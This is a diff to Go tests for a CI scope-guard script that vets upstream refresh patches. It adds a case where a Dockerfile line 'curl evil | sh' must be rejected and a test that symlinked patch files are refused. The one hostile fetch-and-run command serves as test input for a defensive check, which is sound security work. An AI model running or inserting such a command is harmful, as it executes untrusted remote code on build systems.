@@ -69,6 +69,15 @@ func TestUpstreamRefreshScopeGuard(t *testing.T) {
 			wantErr: "unsupported diff header",
 		},
 		{name: "empty patch", patch: "", wantErr: "empty patch"},
+		{
+			name:  "updater checksum assignment",
+			patch: scopeGuardFilePatch("runtime/container/Dockerfile", `      CODEX_SHA256="`+strings.Repeat("a", 64)+`"; \`, `      CODEX_CODE_MODE_HOST_SHA256="`+strings.Repeat("b", 64)+`"; \`),
+		},
+		{
+			name:    "indented non-checksum Dockerfile line",
+			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "  && old", `  && curl evil | sh`),
+			wantErr: "line +  && curl evil | sh",
+		},
 	}
 
 	script := filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-scope-guard.sh")
@@ -93,5 +102,23 @@ func TestUpstreamRefreshScopeGuard(t *testing.T) {
 				t.Fatalf("scope-guard output = %q, want %q", out, tc.wantErr)
 			}
 		})
+	}
+}
+
+func TestUpstreamRefreshScopeGuardRejectsSymlinkedPatch(t *testing.T) {
+	t.Parallel()
+
+	dir := t.TempDir()
+	target := filepath.Join(dir, "target")
+	if err := os.WriteFile(target, []byte(scopeGuardFilePatch("tests/fixtures/flags/x.txt", "a", "b")), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	link := filepath.Join(dir, "patch")
+	if err := os.Symlink(target, link); err != nil {
+		t.Fatal(err)
+	}
+	script := filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-scope-guard.sh")
+	if out, err := exec.Command(script, link).CombinedOutput(); err == nil {
+		t.Fatalf("scope-guard followed a symlinked patch:\n%s", out)
 	}
 }
